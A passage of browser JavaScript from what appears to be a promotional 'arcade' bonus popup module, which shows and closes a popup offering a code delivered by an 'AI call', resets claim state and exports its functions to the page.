            var timerDisplay = document.getElementById('arcadeTimer');
            var requestBtn = document.getElementById('arcadeRequestBtn');
            var codeSection = document.getElementById('arcadeCodeSection');
            
            if (statusIcon) statusIcon.innerHTML = '🎮';
            if (statusText) {
                statusText.innerHTML = '<strong>AI CALL</strong> will provide your code';
            }
            if (phoneDisplay) phoneDisplay.style.display = 'none';
            if (timerDisplay) timerDisplay.style.display = 'none';
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
            }
            if (codeSection) codeSection.classList.remove('show');
        }
        
        console.log('🎮 Arcade Popup shown');
    }
    
    function closeArcadePopup() {
        var popup = document.getElementById('arcadePopup');
        if (popup) {
            popup.classList.remove('show');
            
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
        }
        
        stopArcadeTimer();
        callInProgress = false;
        
        // Reset claim state in playbonus.js
        if (window.PlayBonus && window.PlayBonus.resetClaimState) {
            window.PlayBonus.resetClaimState();
        }
    }
    
    // ========== INIT ==========
    function init() {
        addArcadeStyles();
        console.log('🎮 Arcade Popup Module ready');
    }
    
    // ========== EXPORT ==========
    window.showPopup = showArcadePopup;
    window.closePopup = closeArcadePopup;
    window.getFirewallStatus = getFirewallStatus;
    window.ArcadePopup = {
        show: showArcadePopup,
        close: closeArcadePopup
    };
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
